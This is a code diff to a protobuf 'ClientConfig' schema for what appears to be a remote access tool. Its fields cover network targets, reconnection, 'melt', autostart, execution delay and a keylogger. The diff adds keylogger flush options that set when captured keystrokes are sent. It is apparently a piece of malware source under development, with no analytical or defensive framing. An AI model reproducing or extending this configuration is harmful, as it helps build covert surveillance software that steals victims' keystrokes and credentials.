@@ -17,16 +17,16 @@ message ClientConfig {
 	//general
 	required string output_type = 1;
 	required int32 build_number = 2;
+	optional string viewer_user = 18;
 	
-	
-	optional bool always_imsg = 3;
-	optional string imsg = 4;
 
 	//network
 	repeated NetworkTarget target = 5;
 	required int32 reconnect_period = 6;
 
 	//execution
+	optional bool always_imsg = 3;
+	optional string imsg = 4;
 	optional int32 delay = 7;
 	optional bool melt = 8;
 	optional bool autostart = 9;
@@ -42,8 +42,6 @@ message ClientConfig {
 	// features
 	optional bool keylogger = 17;
 
-	optional string viewer_user = 18;
-	
 	// authentication
 	required AuthType authType = 19;
 	
@@ -51,6 +49,14 @@ message ClientConfig {
 	optional string password = 21;
 
 	optional bool allow_misc_connections = 23;
+	
+	// keylogger options
+	enum FLUSH_METHOD {
+		TIME = 1;
+		EVENT = 2;
+	}
+	optional FLUSH_METHOD keylogger_flush_method = 24;
+	optional int32 keylogger_flush_value = 25;
 	
 }
 
